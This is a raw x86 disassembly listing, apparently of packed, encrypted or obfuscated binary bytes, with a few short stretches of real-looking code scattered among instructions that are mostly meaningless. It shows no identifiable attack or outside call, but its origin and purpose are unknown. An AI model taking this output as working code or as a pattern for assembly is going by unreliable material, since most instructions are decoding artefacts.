  405188:	mov    dh,0x3
  40518a:	mov    ah,0xc1
  40518c:	mov    esp,0x87ef74b9
  405191:	adc    al,0x66
  405193:	pop    ds
  405194:	cmp    BYTE PTR [ebp+edx*8+0xb148d74],ah
  40519b:	call   0xc393:0xde65d5cb
  4051a2:	dec    esi
  4051a3:	and    BYTE PTR [edi+eiz*8+0x6251e773],bh
  4051aa:	adc    eax,0xf985b7f7
  4051af:	jg     0x40514e
  4051b1:	jp     0x405217
  4051b3:	dec    esi
  4051b4:	cld    
  4051b5:	sub    DWORD PTR [edi+esi*4],edi
  4051b8:	in     eax,0x1c
  4051ba:	dec    DWORD PTR [edi+0x5c52cb80]
  4051c0:	xor    BYTE PTR [edx+0x4c3bf4ba],0x5c
  4051c7:	lahf   
  4051c8:	xchg   BYTE PTR [edi-0x23],bl
  4051cb:	mov    ah,0x2
  4051cd:	repnz mov ecx,0xe16d7559
  4051d3:	call   0x5f54626a
  4051d8:	mov    eax,0x825c35d3
  4051dd:	mov    esi,0xc2fa4c86
  4051e2:	mov    dh,0x4a
  4051e4:	or     al,0x12
  4051e6:	std    
  4051e7:	add    dh,BYTE PTR [eax+0x5abbb730]
  4051ed:	inc    eax
  4051ee:	and    eax,0x9884c362
  4051f3:	out    dx,eax
  4051f4:	cmc    
  4051f5:	xor    DWORD PTR [edi-0x45],edx
  4051f8:	int    0x21
  4051fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4051fb:	sar    esp,cl
  4051fd:	pop    ss
  4051fe:	std    
  4051ff:	rol    ecx,0xd3
  405202:	daa    
  405203:	add    eax,0x9d84a0d3
  405208:	jecxz  0x405234
  40520a:	imul   esp,DWORD PTR ds:[esi+0x1f4d5957],0xffffffd7
  405212:	or     eax,0xa8f76cef
  405217:	or     bl,dh
  405219:	stos   DWORD PTR es:[edi],eax
  40521a:	inc    edx
  40521b:	pop    ds
  40521c:	test   eax,0xbc41e34f
  405221:	or     dh,bl
  405223:	int3   
  405224:	in     al,0xc8
  405226:	xchg   ebp,eax
  405227:	jg     0x405220
  405229:	adc    ah,BYTE PTR [ecx-0xe]
  40522c:	fsubr  st,st(4)
  40522e:	push   ebx
  40522f:	and    DWORD PTR [esi],esi
  405231:	shl    BYTE PTR [esi],cl
  405233:	stos   DWORD PTR es:[edi],eax
  405234:	push   edx
  405235:	ss add ecx,esi
  405238:	(bad)
  40523c:	cmp    bl,BYTE PTR [edi-0x3ea95c0]
  405242:	adc    DWORD PTR [edi-0x67],edi
  405245:	xchg   edi,eax
  405246:	xchg   ebx,eax
  405247:	retf   0x57b6
  40524a:	push   cs
  40524b:	push   ebp
  40524c:	mov    ds:0xbe71489e,al
  405251:	xchg   ebp,eax
  405252:	xchg   DWORD PTR [edx+0x26],ebp
  405255:	cmp    bh,cl
  405257:	xchg   BYTE PTR [esi+ebp*1],al
  40525a:	xor    al,0x31
  40525c:	and    al,0x1a
  40525e:	mov    ebx,0xca1983b4
  405263:	enclu  
  405266:	stos   DWORD PTR es:[edi],eax
  405267:	int    0xd1
  405269:	inc    ebx
  40526a:	mov    dh,0x4a
  40526c:	pop    esp
  40526d:	out    0x72,eax
  40526f:	ins    BYTE PTR es:[edi],dx
  405270:	pop    eax
  405271:	icebp  
  405272:	pop    esi
  405273:	jae    0x40522b
  405275:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405276:	jbe    0x40526e
  405278:	(bad)  
  405279:	or     eax,0xbf0af74c
  40527e:	test   al,0xb4
  405280:	jecxz  0x40525a
  405282:	and    ebp,DWORD PTR [esi]
  405284:	push   ebx
  405285:	xchg   esi,eax
  405286:	pop    ds
  405287:	(bad)  
  405288:	lods   al,BYTE PTR ds:[esi]
  405289:	imul   edi,DWORD PTR [edi],0x255994d7
  40528f:	(bad)  
  405291:	sbb    edx,DWORD PTR [ecx]
  405293:	test   BYTE PTR [edx+0x40],al
  405296:	lock sub cl,0x12
  40529a:	jle    0x4052ca
  40529c:	add    bh,BYTE PTR [ecx-0x701efd57]
  4052a2:	(bad)  [ebx-0x1c]
  4052a5:	adc    eax,0xfdb6fb1d
  4052aa:	mov    bl,0xf7
  4052ac:	js     0x405251
  4052ae:	pop    ecx
  4052af:	(bad)  [edi+0x1d]
  4052b2:	mov    cl,0x33
  4052b4:	xchg   edi,eax
  4052b5:	sub    eax,0x5d052730
  4052ba:	adc    BYTE PTR [esi-0x27],bl
  4052bd:	(bad)  
  4052be:	stc    
  4052bf:	fadd   QWORD PTR [esp+edi*1]
  4052c2:	inc    esi
  4052c3:	inc    ecx
  4052c5:	in     al,0xa6
  4052c7:	bound  ecx,QWORD PTR ss:[ecx+0x12f71fae]
  4052ce:	fcom   DWORD PTR [esi+ebp*1+0x4]
  4052d2:	pop    edx
  4052d3:	outs   dx,BYTE PTR ds:[esi]
  4052d4:	jb     0x405261
  4052d6:	add    al,0xab
  4052d8:	arpl   WORD PTR [ebx],cx
  4052da:	dec    eax
  4052db:	mov    ecx,0x1bb28b9f
  4052e0:	scas   eax,DWORD PTR es:[edi]
  4052e1:	mov    BYTE PTR [edx],bl
  4052e3:	jmp    0xbf44:0xa697c053
  4052ea:	jnp    0x40533c
  4052ec:	aaa    
  4052ed:	not    BYTE PTR [ebp+esi*4-0x744466d1]
  4052f4:	xor    DWORD PTR [ebx-0x3661a622],edx
  4052fa:	mov    bh,0x4e
  4052fc:	dec    ecx
  4052fd:	inc    edx
  4052fe:	(bad)  
  4052ff:	call   0x9e:0xff659d87
  405306:	test   BYTE PTR [ebx+ebp*8+0x6441adf],al
  40530d:	scas   al,BYTE PTR es:[edi]
  40530e:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405310:	outs   dx,BYTE PTR ds:[esi]
  405311:	mov    ebp,0x707c6fd9
  405316:	hlt    
  405317:	xchg   DWORD PTR [ebx+ecx*4-0x633b681],ebx
  40531e:	pop    ss
  40531f:	jns    0x4052e7
  405321:	jnp    0x40530b
  405323:	ret    0xaf88
  405326:	dec    eax
  405327:	add    al,0xa3
  405329:	and    bl,BYTE PTR ds:0x8d7d967c
  40532f:	dec    eax
  405330:	retf   
  405331:	ret    
  405332:	adc    BYTE PTR [edi+ebx*4],cl
  405335:	mov    WORD PTR [ecx-0x3d2ee09e],?
  40533b:	push   ds
  40533c:	sti    
  40533d:	out    dx,al
  40533e:	(bad)  
  405340:	sahf   
  405341:	test   al,0x4e
  405343:	jecxz  0x405373
  405345:	loope  0x4053c3
  405347:	inc    esp
  405348:	jl     0x40535f
  40534a:	rcr    BYTE PTR [ecx-0x1771f8de],1
  405350:	retf   0xc713
  405353:	xlat   BYTE PTR ds:[ebx]
  405354:	test   BYTE PTR [ecx],cl
  405356:	sbb    esp,DWORD PTR [ebx-0x11bd967f]
  40535c:	pop    ecx
  40535d:	retf   0x57c7
  405360:	inc    ebp
  405361:	inc    esp
  405362:	icebp  
  405363:	and    BYTE PTR [esi],bl
  405365:	sub    DWORD PTR [ebx],eax
  405367:	sbb    DWORD PTR [ebp+ebp*2+0x75],0x26
  40536c:	lods   eax,DWORD PTR ds:[esi]
  40536d:	gs jp  0x4053c1
  405370:	mov    eax,ds:0xbc621a3a
  405375:	imul   ebx,DWORD PTR [edx+ecx*1-0x8],0x52229a71
  40537d:	xor    DWORD PTR [ecx-0x40],ecx
  405380:	test   DWORD PTR [esi-0x6c],edi
  405383:	pop    es
  405384:	in     eax,0x4e
  405386:	and    eax,0xc56cf7bb
  40538b:	in     al,0x68
  40538d:	(bad)  
  40538e:	push   ds
  40538f:	(bad)  
  405391:	push   0x5b
  405393:	fcom   DWORD PTR [edi]
  405395:	inc    edi
  405396:	sub    al,0x46
  405398:	lahf   
  405399:	and    al,0x52
  40539c:	push   cs
  40539d:	jge    0x4053cd
  40539f:	mov    ds:0x8dfdc39,eax
  4053a4:	ret    0x5fb5
  4053a7:	sbb    BYTE PTR [edi+0x55a5665a],bh
  4053ad:	jns    0x4053e7
  4053af:	or     al,0xc1
  4053b1:	aad    0x4
  4053b3:	test   DWORD PTR [ebx+0x1b],edx
  4053b6:	push   cs
  4053b7:	popa   
  4053b8:	cdq    
  4053b9:	dec    esi
  4053ba:	dec    ebp
  4053bb:	pop    esp
  4053bc:	xor    BYTE PTR [eax+0x76a979c9],al
  4053c2:	sbb    DWORD PTR [ebx-0x2132444b],ebx
  4053c8:	mov    ch,0x7
  4053ca:	jb     0x40543a
  4053cc:	shr    DWORD PTR [edi],cl
  4053ce:	and    esp,DWORD PTR [ebx]
  4053d0:	and    BYTE PTR es:[bx+di-0x5b64],al
  4053d6:	adc    BYTE PTR [ebx+0x48],bh
  4053d9:	add    esi,0x58
  4053dc:	sar    al,1
  4053de:	mov    ds:0xdf850c60,eax
  4053e3:	pusha  
  4053e4:	and    al,0xc0
  4053e6:	repnz lahf 
  4053e8:	imul   edi,esp,0xffffffbc
  4053eb:	mov    ebx,0x395f11ef
  4053f0:	xchg   edi,eax
  4053f1:	push   ss
  4053f2:	adc    cl,BYTE PTR [eax+0x5d]
  4053f5:	in     eax,0x6e
  4053f7:	or     cl,BYTE PTR [ebx-0x3a0dd4a7]
  4053fd:	inc    edx
  4053fe:	push   cs
  4053ff:	rcl    ebx,1
  405401:	mov    esi,0x758462b5
  405406:	dec    ebp
  405407:	out    0xf9,al
  405409:	mov    dl,0x8b
  40540b:	imul   edx,DWORD PTR [eax-0x6455219d],0x1a
  405412:	das    
  405413:	jg     0x405490
  405415:	add    al,0x7f
  405417:	push   esi
  405418:	sahf   
  405419:	sahf   
  40541a:	nop
  40541b:	scas   eax,DWORD PTR es:[edi]
  40541c:	or     al,0xe7
  40541e:	pop    es
  40541f:	stos   DWORD PTR es:[edi],eax
  405420:	lahf   
  405421:	imul   esi,DWORD PTR [esi],0x17
  405424:	push   ecx
  405425:	data16 xlat BYTE PTR ds:[ebx]
  405427:	mov    edx,0xf5de242f
  40542c:	mov    ecx,0xc71b1b7a
  405431:	daa    
  405432:	jne    0x405420
  405434:	into   
  405435:	push   ecx
  405436:	leave  
  405437:	test   eax,0x463771df
  40543c:	mov    dh,0x72
  40543e:	cmp    ecx,ecx
  405440:	ficom  DWORD PTR [edx+0x73]
  405443:	cmp    al,0x34
  405445:	xchg   eax,ebp
  405447:	cmp    BYTE PTR [eax-0x4b417381],cl
  40544d:	jne    0x4054ca
  40544f:	or     cl,BYTE PTR [esi+0x1726002a]
  405455:	shl    BYTE PTR [edi],cl
  405457:	cs mov esi,0xe8fbf274
  40545d:	jl     0x4054a2
  40545f:	loopne 0x405478
  405461:	mov    edi,ecx
  405463:	mov    dh,0x33
  405465:	sub    al,0xf9
  405467:	push   0xffffff98
  405469:	lods   eax,DWORD PTR ds:[esi]
  40546a:	loopne 0x405483
  40546c:	enter  0xd02b,0x44
  405470:	inc    ebx
  405471:	sub    bl,BYTE PTR [edx-0x34717ea9]
  405477:	mov    esi,0x47329b43
  40547c:	fucomi st,st(2)
  40547e:	leave  
  40547f:	cwde   
  405480:	pop    esi
  405481:	leave  
  405482:	ret    0xc
  405485:	push   ebp
  405486:	mov    ebp,esp
  405488:	push   ecx
  405489:	mov    edx,DWORD PTR ds:0x42e804
  40548f:	mov    edx,DWORD PTR [edx]
  405491:	sbb    DWORD PTR ds:0x42e76b,edx
  405497:	jmp    0x40576a
  40549c:	pop    ecx
  40549d:	scas   al,BYTE PTR es:[edi]
  40549e:	sbb    BYTE PTR [ebx-0xd],al
  4054a1:	push   ecx
  4054a2:	pop    ecx
  4054a3:	mov    dh,0xd4
  4054a5:	(bad)
  4054a8:	push   ss
  4054a9:	adc    DWORD PTR [eax+0x703710af],ecx
  4054af:	jo     0x40545b
  4054b1:	jle    0x405523
  4054b3:	jo     0x40544e
  4054b5:	jo     0x405515
  4054b7:	mov    dl,0x26
  4054b9:	(bad)  
  4054ba:	popa   
  4054bb:	int3   
  4054bc:	push   0x19ddb019
  4054c1:	push   esp
  4054c2:	jb     0x40553a
  4054c4:	ss mov gs,edi
  4054c7:	mov    bh,0xe9
  4054c9:	inc    ecx
  4054ca:	in     al,0x34
  4054cc:	popf   
  4054cd:	js     0x405454
  4054cf:	into   
  4054d0:	out    dx,al
  4054d1:	stos   BYTE PTR es:[edi],al
  4054d2:	dec    ebx
  4054d3:	mov    ch,0x70
  4054d5:	cmp    eax,0x74a3d661
  4054da:	inc    ecx
  4054db:	or     BYTE PTR [ebx],bh
  4054dd:	inc    esi
  4054de:	jmp    0xbf4e7bea
  4054e3:	sub    BYTE PTR ds:[esp+ebx*8-0x3091edc0],dl
  4054eb:	pop    ecx
  4054ec:	aas    
  4054ed:	adc    dl,cl
  4054ef:	mov    edi,DWORD PTR [ebp+0x4721cfae]
  4054f5:	sbb    BYTE PTR [edx-0x54cb814b],al
  4054fb:	cmp    ebx,ebx
  4054fd:	pop    eax
  4054fe:	stos   BYTE PTR es:[edi],al
  4054ff:	pop    ss
  405500:	shl    BYTE PTR ds:0xfd6d13be,0x32
  405507:	gs mov esp,0x8dd5d505
  40550d:	or     dh,bh
  40550f:	test   eax,0xd3e409b7
  405514:	jbe    0x405574
  405516:	daa    
  405517:	and    ebx,DWORD PTR [ebx+0x3c]
  40551a:	es xchg ecx,eax
  40551c:	jmp    0x405504
  40551e:	pop    ebp
  40551f:	cmp    eax,0xe6ce4b61
  405524:	retf   0x5ce9
  405527:	ss aas 
  405529:	shl    al,0x7f
  40552c:	jmp    0x41f05dd0
  405531:	adc    BYTE PTR [ebx+0x43ca00bc],ah
  405537:	xlat   BYTE PTR ds:[ebx]
  405538:	stos   DWORD PTR es:[edi],eax
  405539:	shl    DWORD PTR [edi],cl
  40553b:	and    edi,ecx
  40553d:	cmp    al,0x1a
  40553f:	inc    ebx
  405540:	lds    esp,FWORD PTR [esi-0x1a]
  405543:	loopne 0x405536
  405545:	dec    ebp
  405546:	push   ebp
  405547:	inc    esi
  405548:	mov    DWORD PTR [ecx+0x75cc6bbc],edx
  40554e:	mov    esp,0x522587ed
  405553:	mov    edi,0x5946bb96
  405558:	popa   
  405559:	mov    esi,DWORD PTR [ecx-0x204adf5d]
  40555f:	push   0x8552c1e8
  405564:	in     eax,0x70
  405566:	or     eax,0x8f7bfcde
  40556b:	out    dx,al
  40556c:	cdq    
  40556d:	out    0x3b,eax
  40556f:	hlt    
  405570:	shl    ebp,1
  405572:	push   ebx
  405573:	outs   dx,DWORD PTR ds:[esi]
  405574:	inc    eax
  405575:	xchg   edx,eax
  405576:	ret    
  405577:	inc    BYTE PTR [eax+eiz*1+0x1f]
  40557b:	add    DWORD PTR [edi-0x4f],0xfc10d203
  405582:	sub    edx,ebp
  405584:	xor    eax,0x9ba23af7
  405589:	imul   ebx,DWORD PTR [ecx+0x0],0xffffffcc
  40558d:	mov    esp,0x825b1785
  405592:	dec    ebp
  405593:	push   0x67
  405595:	call   0xd48f:0x6706cf6b
  40559c:	xor    DWORD PTR [ebx+ebx*1+0x4d],esp
  4055a0:	xlat   BYTE PTR ds:[ebx]
  4055a1:	add    DWORD PTR [esi],edi
  4055a3:	(bad)  
  4055a4:	sub    eax,0x5fb8cb0d
  4055a9:	pop    eax
  4055aa:	js     0x4055bd
  4055ac:	jnp    0x405567
  4055ae:	push   ds
  4055af:	xor    al,0x5f
  4055b1:	inc    esp
  4055b2:	jge    0x4055ba
  4055b4:	shl    DWORD PTR [esi-0x59],0xaf
  4055b8:	mov    ch,BYTE PTR [eax+0x74]
  4055bb:	inc    ebp
  4055bc:	nop
  4055bd:	adc    BYTE PTR [eax+0x2f],0x7f
  4055c1:	cmc    
  4055c2:	jmp    0x40558e
  4055c4:	fadd   QWORD PTR [esi+0xc]
  4055c7:	ret    
  4055c8:	frstor [eax-0x183bcee6]
  4055ce:	std    
  4055cf:	test   BYTE PTR [edx-0x6c86a1fa],ah
  4055d5:	adc    DWORD PTR [ecx+0x41],0x39b5a494
  4055dc:	push   es
  4055dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055de:	cmp    al,0x31
  4055e0:	jg     0x4055a3
  4055e2:	fwait
  4055e3:	cmp    DWORD PTR [edi],0xc2c8bbe
  4055e9:	stos   DWORD PTR es:[edi],eax
  4055ea:	loop   0x405578
  4055ec:	mov    ebx,DWORD PTR [ebx-0x13]
  4055ef:	xor    dh,BYTE PTR [edi]
  4055f1:	les    ebp,FWORD PTR ds:0xb34b348d
  4055f7:	aas    
  4055f8:	xchg   ebp,eax
  4055f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4055fa:	dec    esp
  4055fb:	mov    eax,0xbe56c0d6
  405600:	es leave 
  405602:	xor    ebp,edx
  405604:	je     0x40561b
  405606:	push   edx
  405607:	mov    ch,0x30
  405609:	mov    esi,0x8ca65f1e
  40560e:	sbb    al,0xdd
  405610:	rcr    esi,cl
  405612:	jbe    0x40564a
  405614:	cli    
  405615:	repz sub DWORD PTR [edx-0x27],esi
  405619:	in     al,0xa1
  40561b:	call   0x5b73ca1f
  405620:	enter  0x1dd9,0x9
  405624:	mov    al,0x33
  405626:	sub    dl,BYTE PTR [ebx+0x49]
  405629:	xor    BYTE PTR [edi-0x75c521b],ah
  40562f:	mov    al,ds:0x57f80774
  405634:	dec    esp
  405635:	scas   al,BYTE PTR es:[edi]
  405636:	mov    ch,0x66
  405638:	inc    edx
  405639:	mov    ch,0xb4
  40563b:	fld    QWORD PTR [edx+ebp*4+0x7f474e4f]
  405642:	stos   DWORD PTR es:[edi],eax
  405643:	push   ds
  405644:	inc    ebp
  405645:	push   ecx
  405646:	pop    esi
  405647:	out    0xcc,eax
  405649:	sbb    edx,DWORD PTR [ebp+ebx*8-0x6f58e786]
  405650:	dec    BYTE PTR [ebp-0x4b]
  405653:	add    BYTE PTR [eax],cl
  405655:	dec    ecx
  405656:	mov    ecx,DWORD PTR [eax]
  405658:	inc    esi
  405659:	mov    ah,0xfd
  40565b:	cli    
  40565c:	mov    ah,0x77
  40565e:	mov    ebp,db2
  405661:	inc    edi
  405662:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405663:	dec    ecx
  405664:	aaa    
  405665:	xor    DWORD PTR [edi],ecx
  405667:	test   al,0xd8
  405669:	dec    esi
  40566a:	cmp    edi,DWORD PTR [eax+0x22b4f1f7]
  405670:	push   ebp
  405671:	mov    esp,0x300f084c
  405676:	mov    ecx,DWORD PTR [ebx+0x1d]
  405679:	mov    eax,ds:0xe35fb4e8
  40567e:	ins    BYTE PTR es:[edi],dx
  40567f:	ror    BYTE PTR [ecx-0x3a],cl
  405682:	cld    
  405683:	fwait
  405684:	dec    esp
  405685:	ret    0x6ef1
  405688:	(bad)  
  405689:	int3   
  40568a:	std    
  40568b:	in     al,0x92
  40568d:	mov    dh,0x86
  40568f:	je     0x40566e
  405691:	daa    
  405692:	retf   0x3473
  405695:	push   eax
  405696:	fdivr  st(4),st
  405698:	daa    
  405699:	js     0x4056e7
  40569b:	das    
  40569c:	arpl   WORD PTR [edi-0x4c9b4142],bp
  4056a2:	es scas eax,DWORD PTR es:[edi]
  4056a4:	push   ebx
  4056a5:	sbb    ebx,DWORD PTR [eax-0x51f8bb21]
  4056ab:	adc    al,BYTE PTR [eax]
  4056ad:	fldcw  WORD PTR gs:[ebp+0x8]
  4056b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4056b2:	mov    ebx,0x99b015ec
  4056b7:	push   0x8dce696e
  4056bc:	add    eax,0x9003a822
  4056c1:	cwde   
  4056c2:	push   0x42
  4056c4:	sbb    dl,al
  4056c6:	jmp    0x21c0a4f3
  4056cb:	mov    al,ds:0x6c2da1ca
  4056d0:	jmp    0x40574b
  4056d2:	inc    ebp
  4056d3:	jmp    0x40566e
  4056d5:	or     bh,BYTE PTR [ecx+esi*2-0x2d]
  4056d9:	fdiv   st,st(2)
  4056db:	pushf  
  4056dc:	inc    edx
  4056dd:	sbb    al,0xc8
  4056df:	mov    dh,0x2b
  4056e1:	ss dec edi
  4056e3:	dec    eax
  4056e4:	sahf   
  4056e5:	push   edi
  4056e6:	dec    esp
  4056e7:	push   esi
  4056e8:	iret   
  4056e9:	jmp    0xcc7d:0x248e5b8d
  4056f0:	xor    DWORD PTR [ecx-0x10de3e1b],ecx
  4056f6:	je     0x405720
  4056f8:	mov    al,ds:0x2494d220
  4056fd:	push   ss
  4056fe:	jmp    0xbd063d48
  405703:	dec    esp
  405704:	fs je  0x4056e8
  405707:	or     al,0xc3
  405709:	mov    ecx,0x9bda0bd
  40570e:	jno    0x4056bf
  405710:	jle    0x4056dc
  405712:	ret    
  405713:	sar    DWORD PTR [eax+0x2c3b35cf],0x77
  40571a:	cmp    bl,BYTE PTR [eax+0x74]
  40571d:	cmc    
  40571e:	pushf  
  40571f:	pusha  
  405720:	clc    
  405721:	fist   DWORD PTR [ebp+0x2ce5f909]
  405727:	fdiv   DWORD PTR [eax+0x7936ef6d]
  40572d:	pushf  
  40572e:	adc    edi,ebx
  405730:	ja     0x405729
  405732:	data16 and bh,cl
  405735:	xor    eax,edx
  405737:	fimul  DWORD PTR [edi+0x7]
  40573a:	mov    esp,DWORD PTR [ecx+0x5c]
  40573d:	sub    eax,0x66d5d2d1
  405742:	xor    al,BYTE PTR [edx]
  405744:	stos   DWORD PTR es:[edi],eax
  405745:	fadd   QWORD PTR [edi-0x37345bcf]
  40574b:	pop    edi
  40574c:	addr16 int3 
  40574e:	call   0x2365393a
  405753:	sbb    eax,0x1eac6388
  405758:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405759:	or     esp,DWORD PTR [esi-0x728031e4]
  40575f:	mov    ecx,0x953f0a66
  405764:	mov    ebp,ebp
  405766:	mov    ecx,0x510a5e5b
  40576b:	movzx  eax,WORD PTR ds:0x42fe06
  405772:	and    eax,DWORD PTR ds:0x42fdfa
  405778:	mov    ds:0x42fe06,eax
  40577d:	jmp    0x405a50
  405782:	ja     0x4057cf
  405784:	and    eax,0x717221b4
  405789:	dec    ebx
  40578a:	xchg   DWORD PTR [edx+0x3fb591be],eax
  405790:	push   esi
  405791:	xlat   BYTE PTR ds:[ebx]
  405792:	dec    edx
  405793:	xor    eax,0x7eaa7070
  405798:	jo     0x40580a
  40579a:	add    BYTE PTR [eax+0x67],ch
  40579d:	dec    esp
  40579e:	arpl   WORD PTR [ebp+eax*2-0x5f],dx
  4057a2:	das    
  4057a3:	clc    
  4057a4:	jnp    0x4057d4
  4057a6:	je     0x405750
  4057a8:	and    BYTE PTR [esi+0x4f5fef13],bh
  4057ae:	inc    ebp
  4057af:	mov    ch,0xd6
  4057b1:	adc    al,0x10
  4057b3:	mov    cl,BYTE PTR [ebx]
  4057b5:	sahf   
  4057b6:	int3   
  4057b7:	dec    edi
  4057b8:	mov    cl,0x93
  4057ba:	mov    eax,ds:0x2d8cf5ab
  4057bf:	imul   ecx
  4057c1:	fidivr WORD PTR [edx+ebp*1-0x4f]
  4057c5:	add    BYTE PTR [ebx+0x52],dl
  4057c8:	mov    ds:0x65e4f204,al
  4057cd:	sub    al,0x5d
  4057cf:	shl    BYTE PTR [esi-0x288648fa],1
  4057d5:	and    ah,BYTE PTR [ebx+ecx*1-0x6ab127c0]
  4057dc:	ins    DWORD PTR es:[edi],dx
  4057dd:	loope  0x405850
  4057df:	mov    bh,0xe6
  4057e1:	and    eax,0xaac02d8e
  4057e6:	jb     0x405791
  4057e8:	adc    esi,ecx
  4057ea:	push   edx
  4057eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057ec:	and    ebp,DWORD PTR [edi+edi*4-0x5d03b449]
  4057f3:	into   
  4057f4:	dec    eax
  4057f5:	dec    ebp
  4057f6:	fimul  DWORD PTR [eax+edx*4]
  4057f9:	xor    edi,DWORD PTR [edx+0x3ce99ef8]
  4057ff:	cdq    
  405800:	test   DWORD PTR [edx+0x4d8cf153],0xd63ec15
  40580a:	push   edx
  40580b:	add    dl,BYTE PTR [eax+esi*4+0x4d]
  40580f:	cdq    
  405810:	pop    es
  405811:	in     al,0x46
  405813:	repnz push es
  405815:	hlt    
  405816:	and    al,0x6b
  405818:	and    DWORD PTR [eax],esi
  40581a:	push   ebp
  40581b:	jmp    0x1724:0xf1d65e40
  405822:	bound  esp,QWORD PTR [ecx+0x46]
  405825:	fisttp QWORD PTR [ebx]
  405827:	jb     0x405872
  405829:	xor    al,0xbf
  40582b:	jae    0x40587c
  40582d:	cs pop edx
  40582f:	sbb    BYTE PTR [ebp+0x5669cef],bl
  405835:	dec    esp
  405836:	frstpm(287 only) 
  405838:	push   esi
  405839:	cmp    esi,DWORD PTR [ecx+esi*2-0x2f]
  40583d:	and    eax,0x4bc59b61
  405842:	push   0xf
  405844:	cmp    al,0x28
  405847:	out    0xea,eax
  405849:	xor    BYTE PTR [edi+0x3361ffcc],ch
  40584f:	popf   
  405850:	and    bh,BYTE PTR [eax-0x21]
  405853:	daa    
  405854:	jae    0x405810
  405856:	cwde   
  405857:	sbb    eax,0xe891677a
  40585c:	fmul   DWORD PTR [esi]
  40585e:	mov    eax,0xd760e35e
  405863:	shl    ebp,1
  405865:	or     BYTE PTR [esi-0x2d],cl
  405868:	scas   al,BYTE PTR es:[edi]
  405869:	jnp    0x405858
  40586b:	call   0x4197:0xe3a3f3b0
  405872:	xchg   esi,eax
  405873:	aam    0x1c
  405875:	dec    eax
  405876:	xlat   BYTE PTR ds:[ebx]
  405877:	sahf   
  405878:	sub    bh,BYTE PTR [edx+0x6f]
  40587b:	out    dx,al
  40587c:	sbb    esp,DWORD PTR [eax-0x72]
  40587f:	push   ebp
  405880:	repz fmul QWORD PTR [ebp+0x5f]
  405884:	xchg   edx,eax
  405885:	adc    DWORD PTR ds:0xe7253667,ebx
  40588b:	test   DWORD PTR [edx+0x59118ce4],esp
  405891:	repz or al,0x75
  405894:	adc    DWORD PTR [eax-0x44],0x7461adda
  40589b:	fadd   st,st(6)
  40589d:	out    dx,eax
  40589e:	aaa    
  40589f:	xchg   edi,eax
  4058a0:	xchg   dh,dh
  4058a2:	repz dec esp
  4058a4:	cwde   
  4058a5:	mov    ebp,0x212bb33b
  4058aa:	les    esp,FWORD PTR [ecx-0x5c]
  4058ad:	mov    dh,0x92
  4058af:	jge    0x40586c
  4058b1:	or     BYTE PTR [esi-0x793fdefc],dl
  4058b7:	and    BYTE PTR [eax],ch
  4058b9:	adc    al,0x2c
  4058bb:	(bad)
  4058bf:	mov    ecx,0xd3e8a2c0
  4058c4:	cmp    DWORD PTR [edx+ecx*2+0x5bd80782],esi
  4058cb:	or     dh,ch
  4058cd:	push   ebx
  4058ce:	or     ch,BYTE PTR [esp+ebp*8+0x78735bfe]
  4058d5:	sub    DWORD PTR [eax+0x68],edx
  4058d8:	mov    bh,ah
  4058da:	cmp    DWORD PTR [esi+0x7d],eax
  4058dd:	(bad)  
  4058de:	daa    
  4058df:	imul   eax,edx,0xd9a780bc
  4058e5:	pop    es
  4058e6:	shl    DWORD PTR [ebx],cl
  4058e8:	das    
  4058e9:	and    eax,0xb88d7b58
  4058ee:	or     eax,0xb95e7cc5
  4058f3:	mov    ds:0xe955a8bc,al
  4058f8:	jno    0x405898
  4058fa:	test   eax,0xa6996502
  4058ff:	pop    es
  405900:	popf   
  405901:	dec    esi
  405902:	fnstsw WORD PTR [ebp+0x31e5aa79]
  405908:	mov    bh,0x52
  40590a:	push   eax
  40590b:	mov    al,0x79
  40590d:	push   0x1d20818d
  405912:	hlt    
  405913:	loopne 0x405907
  405915:	sub    cl,BYTE PTR [ebx-0x49]
  405918:	mov    ds:0x581bd872,al
  40591d:	and    bh,cl
  40591f:	clc    
  405920:	xor    eax,0x6353db17
  405925:	pop    edx
  405926:	dec    DWORD PTR [ecx-0x5e]
  405929:	push   0xa48a643a
  40592e:	jle    0x4058c1
  405930:	loopne 0x405977
  405932:	xor    DWORD PTR [edx+0x25],esp
  405935:	in     al,0xc3
  405937:	cld    
  405938:	push   ebx
  405939:	xchg   BYTE PTR [edi+eax*4-0x2571f6cc],ch
  405940:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405941:	adc    al,0x0
  405943:	xor    edi,edi
  405945:	test   dl,bl
  405947:	imul   ebx,DWORD PTR [edx],0xffffffc0
  40594a:	dec    ecx
  40594b:	pop    ds
  40594c:	mov    BYTE PTR [ecx-0x68],0x72
  405950:	mov    DWORD PTR [ebx-0x21],eax
  405953:	lahf   
  405954:	cmovne eax,DWORD PTR [edi-0x66acf805]
  40595b:	repnz push ebp
  40595d:	shl    BYTE PTR [esi+0x7faff479],0x35
  405964:	pop    eax
  405965:	mov    ebp,ss
  405967:	mov    eax,DWORD PTR [edx]
  405969:	cmp    BYTE PTR [esi+0x38382cb],cl
  40596f:	in     al,0xbf
  405971:	xor    esi,eax
  405973:	sub    edx,esi
  405975:	enter  0xce6,0xa7
  405979:	xchg   esp,eax
  40597a:	sub    al,0x14
  40597c:	in     al,dx
  40597d:	cld    
  40597e:	mov    eax,ds
  405980:	xchg   BYTE PTR [esi+esi*4-0x1e],dl
  405984:	jmp    0x9076cd71
  405989:	push   ds
  40598a:	sbb    DWORD PTR [edx-0x5],edi
  40598d:	dec    edx
  40598e:	mov    ds:0x2be29ff4,eax
  405993:	retf   0xd126
  405996:	xor    cl,BYTE PTR [edx+eax*8]
  405999:	imul   ebp,DWORD PTR [ecx+eax*8+0x5b6a65df],0x9
  4059a1:	lods   al,BYTE PTR ds:[esi]
  4059a2:	dec    ecx
  4059a3:	rol    BYTE PTR [ecx],0x37
  4059a6:	ins    DWORD PTR es:[edi],dx
  4059a7:	je     0x4059ba
  4059a9:	adc    al,0xe1
  4059ab:	(bad)
  4059ae:	call   FWORD PTR ss:[esi-0x67257d35]
  4059b5:	fbld   TBYTE PTR [ebx-0x66]
  4059b8:	push   edx
